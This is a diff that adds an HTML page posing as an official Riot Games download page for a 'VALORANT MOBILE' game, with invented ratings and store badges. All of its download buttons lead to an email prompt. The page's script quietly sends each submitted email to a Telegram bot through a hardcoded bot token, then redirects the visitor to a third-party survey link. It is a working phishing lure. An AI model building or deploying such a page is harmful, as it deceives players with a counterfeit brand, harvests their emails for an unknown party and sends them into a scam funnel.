@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VALORANT MOBILE - Official Download</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #333333;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            padding: 20px 0;
+            background-color: white;
+            border-bottom: 1px solid #e1e4e8;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .app-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .app-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 18px;
+            overflow: hidden;
+            background-color: #0f1923;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .app-icon-v {
+            color: #ff4655;
+            font-size: 40px;
+            font-weight: bold;
+            transform: skewX(-10deg);
+        }
+        
+        .app-details {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .app-title {
+            font-size: 1.7rem;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .developer {
+            color: #0070F3;
+            margin-bottom: 5px;
+            font-size: 0.9rem;
+        }
+        
+        .badges {
+            display: flex;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        
+        .badge {
+            background-color: #f1f3f5;
+            color: #555;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+        }
+        
+        .badge.featured {
+            background-color: #ebf8ee;
+            color: #2b8a3e;
+        }
+        
+        .get-access-btn {
+            background-color: #0070F3;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 10px 24px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .get-access-btn:hover {
+            background-color: #0060DF;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 112, 243, 0.2);
+        }
+        
+        /* Ratings Section */
+        .ratings-section {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            gap: 40px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        
+        .rating-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .rating-number {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #333;
+        }
+        
+        .stars {
+            color: #ffb800;
+            margin: 5px 0;
+            font-size: 1.1rem;
+        }
+        
+        .rating-label {
+            color: #666;
+            font-size: 0.85rem;
+        }
+        
+        /* Hero Section */
+        .hero-section {
+            padding: 30px 0;
+            text-align: center;
+        }
+        
+        .hero-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 30px;
+            color: #333;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .hero-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
+            background-color: #FF4655;
+        }
+        
+        /* Image Gallery */
+        .image-gallery {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            padding: 10px 0 20px;
+            scroll-snap-type: x mandatory;
+            margin-bottom: 30px;
+            scrollbar-width: none; /* Firefox */
+        }
+        
+        .image-gallery::-webkit-scrollbar {
+            display: none; /* Chrome, Safari, Edge */
+        }
+        
+        .gallery-image {
+            flex: 0 0 auto;
+            scroll-snap-align: center;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            height: 180px;
+            background-color: #eee;
+            transition: transform 0.3s ease;
+        }
+        
+        .gallery-image:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+        
+        .gallery-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        
+        .gallery-nav {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+        
+        .gallery-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #ccc;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .gallery-dot.active {
+            background-color: #FF4655;
+            transform: scale(1.2);
+        }
+        
+        /* What's New Section */
+        .whats-new {
+            background-color: white;
+            border-radius: 16px;
+            padding: 30px;
+            margin: 40px 0;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .whats-new:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #333;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 0;
+            width: 40px;
+            height: 3px;
+            background-color: #FF4655;
+        }
+        
+        .version {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            display: inline-block;
+            padding: 4px 10px;
+            background-color: #f8f9fa;
+            border-radius: 50px;
+        }
+        
+        .update-list {
+            list-style-type: none;
+        }
+        
+        .update-list li {
+            margin-bottom: 15px;
+            padding-left: 25px;
+            position: relative;
+            color: #555;
+        }
+        
+        .update-list li::before {
+            content: '•';
+            position: absolute;
+            left: 0;
+            color: #FF4655;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        
+        /* Description Section */
+        .description {
+            background-color: white;
+            border-radius: 16px;
+            padding: 30px;
+            margin: 40px 0;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .description:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .description p {
+            color: #555;
+            margin-bottom: 25px;
+            line-height: 1.7;
+            font-size: 1.05rem;
+        }
+        
+        .key-features-title {
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin: 25px 0 20px;
+            color: #333;
+        }
+        
+        /* Download Section */
+        .download-section {
+            background: linear-gradient(135deg, #0F1923 0%, #263340 100%);
+            padding: 40px 30px;
+            border-radius: 16px;
+            text-align: center;
+            margin: 40px 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .download-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('/api/placeholder/1100/300') center/cover no-repeat;
+            opacity: 0.05;
+            z-index: 0;
+        }
+        
+        .download-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .download-title {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .download-subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 600px;
+            margin: 0 auto 30px;
+            font-size: 1.1rem;
+        }
+        
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .download-button {
+            background-color: #FF4655;
+            color: #ffffff;
+            text-decoration: none;
+            padding: 14px 30px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 6px 12px rgba(255, 70, 85, 0.3);
+        }
+        
+        .download-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 20px rgba(255, 70, 85, 0.4);
+        }
+        
+        .download-button.android {
+            background-color: #3DDC84;
+            box-shadow: 0 6px 12px rgba(61, 220, 132, 0.3);
+        }
+        
+        .download-button.android:hover {
+            box-shadow: 0 12px 20px rgba(61, 220, 132, 0.4);
+        }
+        
+        .download-button.ios {
+            background-color: #0070F3;
+            box-shadow: 0 6px 12px rgba(0, 112, 243, 0.3);
+        }
+        
+        .download-button.ios:hover {
+            box-shadow: 0 12px 20px rgba(0, 112, 243, 0.4);
+        }
+        
+        .platform-icon {
+            font-size: 1.5rem;
+        }
+        
+        /* Footer */
+        footer {
+            margin-top: 50px;
+            padding: 30px 0;
+            text-align: center;
+            color: #999;
+            font-size: 0.9rem;
+            border-top: 1px solid #e1e4e8;
+        }
+        
+        /* Email Verification Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal {
+            background-color: white;
+            width: 90%;
+            max-width: 500px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.4s ease;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .modal-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #e1e4e8;
+            background-color: #f8f9fa;
+        }
+        
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #333;
+        }
+        
+        .modal-body {
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .modal-body p {
+            margin-bottom: 25px;
+            color: #555;
+            font-size: 1.05rem;
+        }
+        
+        .email-input {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+            margin-bottom: 25px;
+            transition: border-color 0.3s;
+        }
+        
+        .email-input:focus {
+            outline: none;
+            border-color: #0070F3;
+            box-shadow: 0 0 0 3px rgba(0, 112, 243, 0.1);
+        }
+        
+        .verify-btn {
+            background-color: #0070F3;
+            color: white;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .verify-btn:hover {
+            background-color: #0060DF;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 112, 243, 0.2);
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .get-access-btn {
+                align-self: flex-start;
+            }
+            
+            .ratings-section {
+                justify-content: space-around;
+                gap: 20px;
+            }
+            
+            .gallery-image {
+                width: 280px;
+                height: 160px;
+            }
+            
+            .download-title {
+                font-size: 1.7rem;
+            }
+            
+            .download-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="app-info">
+                    <div class="app-icon">
+                        <div class="app-icon-v">V</div>
+                    </div>
+                    <div class="app-details">
+                        <h1 class="app-title">VALORANT MOBILE</h1>
+                        <div class="developer">Riot Games</div>
+                        <div class="badges">
+                            <span class="badge featured">Featured by Apple</span>
+                            <span class="badge">#1 in Action Games</span>
+                        </div>
+                    </div>
+                </div>
+                <button class="get-access-btn" id="get-access">Get Access</button>
+            </div>
+            
+            <div class="ratings-section">
+                <div class="rating-item">
+                    <div class="rating-number">4.8</div>
+                    <div class="stars">★★★★★</div>
+                    <div class="rating-label">250K Ratings</div>
+                </div>
+                <div class="rating-item">
+                    <div class="rating-number">3.2 GB</div>
+                    <div class="rating-label">Size</div>
+                </div>
+                <div class="rating-item">
+                    <div class="rating-number">16+</div>
+                    <div class="rating-label">Age Rating</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <section class="hero-section">
+            <h2 class="hero-title">DEFY THE LIMITS — NOW IN YOUR HANDS</h2>
+            
+            <div class="image-gallery">
+                <div class="gallery-image">
+                    <img src="https://i.ibb.co/nMMQL1Wv/b-GFy-Z2-Uuan-Bn.jpg" alt="VALORANT Mobile Screenshot 1">
+                </div>
+                <div class="gallery-image">
+                    <img src="https://i.ibb.co/zhnBV9sk/image.png" alt="VALORANT Mobile Screenshot 2">
+                </div>
+                <div class="gallery-image">
+                    <img src="https://i.ibb.co/1YWg99RD/ZDQ.jpg" alt="VALORANT Mobile Screenshot 3">
+                </div>
+            </div>
+            
+            <div class="gallery-nav">
+                <span class="gallery-dot active"></span>
+                <span class="gallery-dot"></span>
+                <span class="gallery-dot"></span>
+            </div>
+        </section>
+        
+        <section class="download-section">
+            <div class="download-content">
+                <h2 class="download-title">Download Now</h2>
+                <p class="download-subtitle">Experience the tactical shooter phenomenon on your mobile device</p>
+                <div class="download-buttons">
+                    <button class="download-button android" id="android-download">
+                        <span class="platform-icon">🤖</span>
+                        <span>Download for Android</span>
+                    </button>
+                    <button class="download-button ios" id="ios-download">
+                        <span class="platform-icon">🍎</span>
+                        <span>Download for iOS</span>
+                    </button>
+                </div>
+            </div>
+        </section>
+        
+        <section class="whats-new">
+            <h2 class="section-title">What's New</h2>
+            <p class="version">Version 1.0.3</p>
+            <ul class="update-list">
+                <li>New Map: Sunset Harbor - A coastal paradise turned tactical battleground</li>
+                <li>Agent Balance Updates: Adjustments to Jett and Phoenix abilities</li>
+                <li>Performance optimizations for better gameplay on all devices</li>
+                <li>Various bug fixes and stability improvements</li>
+            </ul>
+        </section>
+        
+        <section class="description">
+            <h2 class="section-title">Description</h2>
+            <p>Experience the tactical thrill of VALORANT, now optimized for mobile. Join over 15 million players in Riot Games' hit competitive shooter, featuring precise gunplay, unique Agent abilities, and intense 5v5 matches.</p>
+            
+            <h3 class="key-features-title">KEY FEATURES:</h3>
+            <ul class="update-list">
+                <li>Tactical 5v5 gameplay with mobile-optimized controls</li>
+                <li>Choose from a diverse roster of Agents, each with unique abilities</li>
+                <li>Competitive ranked mode with skill-based matchmaking</li>
+                <li>Stunning maps with strategic depth</li>
+                <li>Premium weapon skins and Battle Pass rewards</li>
+                <li>Regular content updates and seasonal events</li>
+            </ul>
+        </section>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>© 2025 Riot Games, Inc. VALORANT and any associated logos are trademarks, service marks, and/or registered trademarks of Riot Games, Inc.</p>
+        </div>
+    </footer>
+    
+    <!-- Email Verification Modal -->
+    <div class="modal-overlay" id="email-modal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 class="modal-title">Verify Your Email</h2>
+            </div>
+            <div class="modal-body">
+                <p>Enter your email to receive exclusive access to VALORANT MOBILE</p>
+                <input type="email" class="email-input" id="email-input" placeholder="Enter your email">
+                <button class="verify-btn" id="verify-email">Verify Email</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Show Email Verification Modal when Get Access or Download buttons are clicked
+        document.getElementById('get-access').addEventListener('click', function() {
+            document.getElementById('email-modal').style.display = 'flex';
+        });
+        
+        document.getElementById('android-download').addEventListener('click', function() {
+            document.getElementById('email-modal').style.display = 'flex';
+            sessionStorage.setItem('platform', 'android');
+        });
+        
+        document.getElementById('ios-download').addEventListener('click', function() {
+            document.getElementById('email-modal').style.display = 'flex';
+            sessionStorage.setItem('platform', 'ios');
+        });
+        
+        // Handle Email Verification
+        document.getElementById('verify-email').addEventListener('click', function() {
+            const email = document.getElementById('email-input').value;
+            if (email && email.includes('@')) {
+                // Send the email to Telegram bot first
+                const botToken = '6890305954:AAF2HeMXP_lgjmhjHOxbRzxBUmtCVx-Ykos'; 
+                const chatId = '598136894';
+                const platform = sessionStorage.getItem('platform') || 'android';
+                
+                const message = `New email submitted: ${email} (Platform: ${platform})`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+                
+                // Redirect to the survey page
+                window.location.href = "https://appinstallcheck.com/cl/i/42ldo4";
+            } else {
+                alert('Please enter a valid email address');
+            }
+        });
+        
+        // Image Gallery Navigation
+        const dots = document.querySelectorAll('.gallery-dot');
+        dots.forEach((dot, index) => {
+            dot.addEventListener('click', function() {
+                // Update active dot
+                document.querySelector('.gallery-dot.active').classList.remove('active');
+                this.classList.add('active');
+                
+                // Scroll to corresponding image
+                const gallery = document.querySelector('.image-gallery');
+                const images = document.querySelectorAll('.gallery-image');
+                gallery.scrollTo({
+                    left: images[index].offsetLeft - gallery.offsetLeft,
+                    behavior: 'smooth'
+                });
+            });
+        });
+    </script>
+</body>
+</html>
